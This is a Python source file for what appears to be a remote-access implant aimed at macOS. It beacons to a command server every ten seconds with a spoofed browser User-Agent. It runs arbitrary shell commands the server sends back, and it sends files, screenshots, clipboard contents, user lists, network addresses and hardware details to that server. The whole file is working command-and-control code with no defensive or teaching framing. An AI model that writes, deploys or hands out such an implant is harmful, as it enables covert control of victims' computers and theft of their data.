import aiohttp
import asyncio
import os
import subprocess

SERVER_URL = "http://127.0.0.1:8080"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) Chrome/35.0.1916.47",
    "Authorization": "Bearer valid_token_example"
}

async def check_in():
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{SERVER_URL}/checkin", headers=HEADERS) as response:
            commands = await response.json()
            for cmd in commands:
                await execute_command(session, cmd)

async def execute_command(session, command):
    if command.startswith("cd "):
        os.chdir(command[3:])
    elif command == "screenshot":
        await send_file(session, "screenshot.jpg", f"{SERVER_URL}/screenshot")
    elif command.startswith("download "):
        await send_file(session, command.split(" ")[1], f"{SERVER_URL}/download")
    elif command == "clipboard":
        await send_file(session, "clipboard.txt", f"{SERVER_URL}/clipboard")
    elif command == "listusers":
        result = subprocess.getoutput("dscl . list /Users")
        await send_text(session, result, f"{SERVER_URL}/listusers")
    elif command == "addresses":
        result = subprocess.getoutput("ifconfig | grep 'inet '")
        await send_text(session, result, f"{SERVER_URL}/addresses")
    elif command == "sysinfo":
        result = subprocess.getoutput("system_profiler SPHardwareDataType")
        await send_text(session, result, f"{SERVER_URL}/sysinfo")
    else:
        result = subprocess.getoutput(command)
        print(f"[+] Executed: {command}\n{result}")

async def send_file(session, filename, url):
    if os.path.exists(filename):
        async with session.post(url, headers=HEADERS, data=open(filename, "rb")) as response:
            print(f"[+] Sent {filename}: {await response.text()}")

async def send_text(session, text, url):
    async with session.post(url, headers=HEADERS, data=text.encode()) as response:
        print(f"[+] Sent text data: {await response.text()}")

async def main():
    while True:
        await check_in()
        await asyncio.sleep(10)
        

if __name__ == "__main__":
    asyncio.run(main())
